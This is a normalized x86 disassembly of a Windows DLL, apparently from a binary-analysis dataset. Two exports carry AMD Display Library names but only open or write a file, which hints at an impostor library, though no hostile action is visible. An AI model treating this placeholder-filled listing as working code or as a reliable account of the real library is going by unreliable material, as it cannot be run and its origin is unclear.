call sub_10042990
lea edi [ ebp - 0x178 ]
call sub_1005bb10
lea edi [ ebp - 0x180 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10045ee0
lea edx [ ebp - 0xc4 ]
mov eax 0x4b
call sub_100050e0
mov [ ebp - 0x140 ] 0x7
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x180 ]
push edx
push eax
lea ecx [ ebp - 0x13c ]
call sub_10066e80
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xc4 ]
mov eax 0x112
call sub_100050e0
mov [ ebp - 0x140 ] 0x8
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x13c ]
push edx
push eax
lea ebx [ ebp - 0x178 ]
call sub_100207e0
test eax eax
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x12a
call sub_100050e0
mov [ ebp - 0x140 ] 0x9
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x13c ]
lea edi [ ebp - 0x160 ]
call sub_10052200
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0xbb
call sub_100050e0
mov [ ebp - 0x140 ] 0xa
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x13c ]
lea edi [ ebp - 0x170 ]
call sub_100683f0
cmp eax ebx
je r-xdata
mov [ ebp - 0x140 ] 0xa
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x13c ]
lea edi [ ebp - 0x168 ]
call sub_100148c0
cmp eax ebx
je r-xdata
cmp [ ebp - 0x178 ] ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x5
cmp eax ebx
je r-xdata
mov esi [ ebp - 0x154 ]
xor ebx ebx
cmp [ ebp - 0x160 ] ebx
je r-xdata
mov edi eax
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x158 ]
xor eax eax
mov [ edx ] eax
jmp r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x180 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_10029eb0
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
cmp [ ebp - 0x170 ] ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x6
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ebp - 0x14c ]
lea eax [ ebp - 0x178 ]
push eax
mov eax [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push eax
push ecx
mov eax esi
call sub_100225d0
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
cmp [ ebp - 0x168 ] ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x7
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x160 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_10066910
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
mov ecx eax
cmp ecx ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x8
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x170 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_100349d0
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x188 ]
mov edx [ ebp - 0x144 ]
push eax
mov eax [ ebp - 0x14c ]
push edx
mov edx [ ebp - 0x148 ]
push eax
mov eax [ ebp - 0x150 ]
push edx
push eax
mov eax esi
call sub_10039580
jmp r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x168 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_1002b2f0
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
mov ecx [ ebp - 0x158 ]
mov [ ecx ] eax
lea edx [ ebp - 0xa8 ]
mov eax 0x101
call sub_100050e0
jmp r-xdata
sub_100466d0
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0xb0
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_10019180
mov eax esi
mov esp ebp
pop ebp
retn
sub_10046710
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10083358
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x5c ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x30
mov esi ecx
lea ecx [ esp + 0x3c ]
push 0x0
push ecx
mov ebx edx
mov [ esp + 0x20 ] eax
mov [ esp + 0x40 ] 0x0
call sub_10079a10
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x58 ]
add esp 0xc
cmp [ esi + 0x44 ] 0x0
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] eax
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
push ebx
lea ecx [ esp + 0x14 ]
push ecx
call [ FileTimeToDosDateTime@IAT ]
mov eax [ esp + 0x34 ]
and eax 0x27
xor ebx ebx
mov [ edi ] ax
cmp [ esi + 0x44 ] ebx
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
lea edx [ esp + 0x4c ]
push edx
call [ FileTimeToLocalFileTime@IAT ]
cmp [ esi + 0x4c ] ebx
je r-xdata
or eax 0x100
mov [ edi ] ax
push ebx
xor eax eax
push r--data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x34 ] 0x7
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] ax
call sub_100531b0
lea edx [ esp + 0x18 ]
mov ecx esi
mov [ esp + 0x78 ] ebx
call sub_10022c80
cmp [ esp + 0x2c ] 0x8
mov esi eax
jb r-xdata
mov edx 0x80
or [ edi ] dx
mov eax esi
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x5c ]
xor ecx esp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esp + 0x18 ]
push ecx
call sub_1006591f
add esp 0x4
sub_10046830
push ebp
mov ebp esp
push 0xffffffff
push sub_10080ff3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
mov edx 0x7
xor ecx ecx
xor esi esi
mov [ eax + 0x14 ] edx
mov [ eax + 0x10 ] ecx
mov [ ebp - 0x6c ] eax
mov [ eax ] si
mov [ ebp - 0x4 ] ecx
mov [ eax + 0x30 ] edx
xor edx edx
mov [ eax + 0x2c ] ecx
mov [ eax + 0x1c ] dx
push ecx
push ecx
push 0xffffffff
push edi
push ecx
mov [ ebp - 0x4 ] 0x1
push ecx
mov [ eax + 0x38 ] ecx
mov [ eax + 0x3c ] 0x1
call [ MultiByteToWideChar@IAT ]
lea ebx [ eax + eax + 0x2 ]
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push ebx
push esi
push 0xffffffff
push edi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0x70 ]
push eax
push esi
call [ CommandLineToArgvW@IAT ]
mov edi eax
xor esi esi
cmp edi esi
je r-xdata
lea edx [ ebp - 0x18 ]
lea eax [ esi + 0x4 ]
call sub_10013830
lea edx [ ebp - 0x24 ]
mov eax 0xe1
call sub_10013830
lea edx [ ebp - 0x4c ]
mov eax 0x9e
call sub_10013830
lea edx [ ebp - 0x34 ]
lea eax [ esi + 0x48 ]
call sub_10013830
xor ebx ebx
cmp [ ebp - 0x70 ] esi
jle r-xdata
jmp r-xdata
lea eax [ ebp - 0x18 ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
mov edx [ edi + ebx * 4 ]
sar eax 0x1
push eax
lea ecx [ ebp - 0x18 ]
push ecx
push edx
call sub_1005ac4e
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x24 ]
lea edx [ eax + 0x2 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea ecx [ ecx + eax * 2 ]
xor edx edx
mov eax ecx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x54 ] 0x7
mov [ ebp - 0x68 ] dx
lea esi [ eax + 0x2 ]
lea ebx [ ebx ]
sub eax edx
sar eax 0x1
push eax
mov eax [ edi + ebx * 4 ]
lea edx [ ebp - 0x24 ]
push edx
push eax
call sub_1005ac4e
add esp 0xc
test eax eax
jne r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x68 ]
call sub_100531b0
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x6c ]
jmp r-xdata
lea eax [ ebp - 0x4c ]
lea edx [ eax + 0x2 ]
lea eax [ ebp - 0x24 ]
lea edx [ eax + 0x2 ]
mov edi edi
lea eax [ ebp - 0x68 ]
push eax
call sub_10036380
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x54 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax [ edi + ebx * 4 ]
lea edx [ ebp - 0x4c ]
push edx
push eax
call sub_1005ac4e
add esp 0xc
test eax eax
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea ecx [ ecx + eax * 2 ]
xor edx edx
mov eax ecx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x54 ] 0x7
mov [ ebp - 0x68 ] dx
lea esi [ eax + 0x2 ]
lea ebx [ ebx ]
inc ebx
cmp ebx [ ebp - 0x70 ]
jl r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_1006591f
add esp 0x4
jmp r-xdata
lea eax [ ebp - 0x34 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
lea eax [ ebp - 0x4c ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x68 ]
call sub_100531b0
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x6c ]
add ecx 0x1c
xor esi esi
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax [ edi + ebx * 4 ]
lea edx [ ebp - 0x34 ]
push edx
push eax
call sub_1005ac4e
add esp 0xc
test eax eax
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
lea eax [ ebp - 0x34 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea edx [ ecx + eax * 2 ]
push edx
call [ StrToIntW@IAT ]
mov ecx [ ebp - 0x6c ]
mov [ ecx + 0x38 ] eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea edx [ ecx + eax * 2 ]
push edx
call [ StrToIntW@IAT ]
mov ecx [ ebp - 0x6c ]
mov [ ecx + 0x3c ] eax
sub_10046b50
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
movzx esi ax
mov eax esi
shl esi 0x10
push edi
or eax esi
shr ecx 0x1
mov edi edx
[ edi ]
adc ecx ecx
[ edi ]
pop edi
mov eax edx
pop esi
pop ebp
retn
sub_10046b90
push ebp
mov ebp esp
push 0xffffffff
push sub_10082336
mov eax [ fs : 0x0 ]
push eax
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x208
xor ebx ebx
lea ecx [ ebp - 0x26c ]
push ebx
push ecx
mov [ ebp - 0x284 ] eax
call sub_10079a10
add esp 0xc
lea ecx [ ebp - 0x26c ]
call sub_10048a90
cmp eax ebx
je r-xdata
push 0x144
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x270 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0xb2
call sub_10013830
lea eax [ ebx + 0x1 ]
jmp r-xdata
xor eax eax
push eax
call sub_1004d9c0
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edi [ ebp - 0x270 ]
call sub_1000d540
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x274 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x278 ]
mov [ ebp - 0x278 ] ebx
mov [ ebp - 0x274 ] ebx
call sub_1003b340
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0x278 ]
cmp esi ebx
jne r-xdata
lea ecx [ ebp - 0x26c ]
push ecx
lea esi [ ebp - 0x278 ]
mov [ ebp - 0x270 ] ebx
call sub_10018d10
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0xa2
call sub_10013830
lea eax [ ebp - 0x278 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ebx [ ebp - 0x278 ]
call sub_1003ae80
test eax eax
je r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0xa8
call sub_10013830
mov [ ebp - 0x270 ] 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
lea eax [ ebx + 0x12c ]
mov ebx [ ebp - 0x284 ]
call sub_10017f40
mov edi eax
mov esi [ edi ]
test esi esi
jne r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x50
call sub_10013830
mov [ ebp - 0x270 ] 0x5
jmp r-xdata
mov eax [ ebp - 0x27c ]
test eax eax
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x62
call sub_10013830
mov [ ebp - 0x270 ] 0xa
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
call sub_10018920
push 0x58
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x4c ]
lea eax [ esi + 0x1b ]
call sub_10013830
mov [ ebp - 0x270 ] 0x6
jmp r-xdata
mov esi [ ebp - 0x278 ]
call sub_1001d390
test eax eax
je r-xdata
lea eax [ ebp - 0x278 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
mov eax [ ebp - 0x270 ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor eax eax
mov esi eax
call sub_1000d1d0
jmp r-xdata
lea edi [ ebp - 0x280 ]
lea ecx [ ebp - 0x27c ]
call sub_1003c110
test eax eax
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x10d
call sub_10013830
mov [ ebp - 0x270 ] 0x7
jmp r-xdata
mov ebx [ ebp - 0x278 ]
mov [ edi ] eax
xor eax eax
lea edx [ ebp - 0x27c ]
push edx
lea ecx [ ebp - 0x280 ]
mov [ ebp - 0x27c ] eax
mov [ ebp - 0x280 ] eax
call sub_1001b560
test eax eax
je r-xdata
mov eax [ ebp - 0x280 ]
mov ecx [ ebp - 0x27c ]
push eax
push ecx
lea eax [ ebp - 0x26c ]
call sub_10031770
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0xe9
call sub_10013830
mov [ ebp - 0x270 ] 0x8
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x138
call sub_10013830
lea eax [ ebp - 0x278 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
mov eax 0x9
jmp r-xdata
sub_10046ed0
push ebp
mov ebp esp
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
mov eax [ ebp + 0x8 ]
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov edx 0x9249249
sub edx eax
push edi
cmp edx esi
jae r-xdata
mov edi [ ecx + 0x8 ]
add esi eax
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_1002c5ed
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_1004aef0
mov eax esi
cmp eax esi
jae r-xdata
ADL_Adapter_DisplayAudioEndpoint_Enable
push ebp
mov ebp esp
sub esp 0x10c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push r--data
call [ CreateFileW@IAT ]
push 0x0
lea ecx [ ebp - 0x10c ]
push ecx
push 0x104
lea edx [ ebp - 0x108 ]
push edx
push eax
call [ WriteFile@IAT ]
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x4 ]
sub eax 0x5
add eax eax
xor ecx ebp
add eax eax
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10046fb7
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10039c8c
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_10039c8c
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_10039c8c
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_100680f5
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_10047009
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov eax r--data
mov ecx [ ebp + 0xc ]
cmp ecx 0x2
ja r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
ja r-xdata
cmp [ ebp + 0x14 ] 0x4
ja r-xdata
lea eax [ eax + ecx * 2 ]
imul eax eax 0x5
add eax [ ebp + 0x14 ]
lea eax [ eax * 4 + r--data ]
jmp r-xdata
push 0x4
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_1006581d
add esp 0x10
pop ebp
retn 0x10
sub_10047060
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
test [ ebp + 0x8 ] 0x1
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
je r-xdata
push eax
call sub_1006591f
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_100470c0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
push eax
push ecx
lea edx [ esi + 0x10 ]
push edx
call sub_1000eb20
mov eax [ esi ]
add esp 0xc
push eax
call [ SetEvent@IAT ]
xor eax eax
pop esi
pop ebp
retn 0x4
ADL2_Adapter_SWInfo_Get
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push r--data
call [ CreateFileW@IAT ]
push eax
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
sub eax 0x5
retn
sub_1004711e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_1005aab0
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1004713f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_1001215a
push esi
mov edi eax
call sub_1003729e
push esi
call sub_10024583
push eax
call sub_100048cd
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_10022b5a
and [ esi + 0x1c ] 0x0
pop ecx
sub_100471ac
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ebx [ eax ]
mov eax [ eax + 0x4 ]
call sub_10007cfe
mov ebx [ eax + 0x4 ]
call sub_1003da17
jmp r-xdata
push eax
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push ebx
push 0x0
call sub_10050467
add esp 0x20
test eax eax
jne r-xdata
mov eax esi
cmp esi edi
jl r-xdata
test ebx ebx
jne r-xdata
sub eax 0x2
call sub_1004fd6f
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10055c4b
add esp 0xc
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
cmp esi edi
je r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_10047240
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
mov eax [ ebp - 0x88 ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x8c ]
call sub_1002b48f
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_10010183
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_10017fab
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x1c
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_100473ea
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_100106d4
pop ecx
pop ebp
retn
sub_10047420
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
push edi
mov edi [ LocalFree@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10047480
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov edi eax
cmp esi [ ebp + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
xor ebx ebx
add esi 0x1c
add edi 0x1c
cmp esi [ ebp + 0x8 ]
jne r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp edi esi
je r-xdata
mov eax edi
pop ebx
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] cx
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ edi ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ esi ]
mov [ edi ] ecx
mov [ esi ] ebx
mov edx [ esi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push esi
push edi
call sub_10078db0
add esp 0xc
jmp r-xdata
mov edx [ esi + 0x10 ]
mov [ edi + 0x10 ] edx
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
sub_10047530
push 0xc
push r--data
call sub_10079bf0
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
push esi
call sub_1003bcfa
pop ecx
